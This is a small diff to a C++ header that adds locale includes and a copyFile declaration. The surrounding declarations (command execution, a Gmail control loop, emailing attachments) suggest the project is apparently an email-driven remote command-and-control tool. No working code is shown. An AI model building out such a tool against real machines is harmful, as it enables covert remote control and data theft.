@@ -24,6 +24,8 @@
 #include <vector>
 #include <set> 
 #include <filesystem>
+#include <locale>
+#include <codecvt>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -65,3 +67,7 @@ bool isValidCommand(const std::string& cmd);
 std::string executeCommand(const std::string& cmd);
 void startGmailControlLoop();
 bool sendEmailWithAttachment(const std::string& subject, const std::string& body, const std::string& filepath);
+
+
+// Copy file
+bool copyFile(const std::string& sourcePath, const std::string& destPath);
